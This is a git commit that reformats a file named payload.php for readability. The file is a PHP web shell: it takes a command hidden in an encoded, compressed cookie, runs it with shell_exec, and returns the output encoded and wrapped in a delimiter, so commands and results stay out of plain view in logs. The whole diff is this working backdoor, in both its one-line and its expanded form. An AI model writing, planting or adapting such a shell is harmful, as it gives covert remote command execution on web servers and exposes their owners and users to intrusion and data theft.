4de45afdf239d133d7fd7e90420900c8de629f6e
Jack Rendor <jackrendor@gmail.com>
2019-01-27 14:07:35 +0100

    Since this is not the minified version, it's right to make it readable.

--- payload.php
+++ payload.php
@@ -1,5 +1,21 @@
 <?php
-    $d = base64_decode(bzdecompress(base64_decode(str_replace(" ", "+", $_COOKIE['d']))));
-    $c = base64_decode(bzdecompress(base64_decode(str_replace(" ", "+", $_COOKIE['c']))));
-    echo $d.base64_encode(bzcompress(base64_encode(shell_exec($c)), 9)).$d;
+    $d = base64_decode(
+        bzdecompress(
+            base64_decode(
+                str_replace(" ", "+", $_COOKIE['d'])
+            )
+        )
+    );
+    $c = base64_decode(
+        bzdecompress(
+            base64_decode(
+                str_replace(" ", "+", $_COOKIE['c'])
+            )
+        )
+    );
+    echo $d . base64_encode(
+        bzcompress(
+            base64_encode( shell_exec($c) ),
+             9)
+        ) . $d;
 ?>
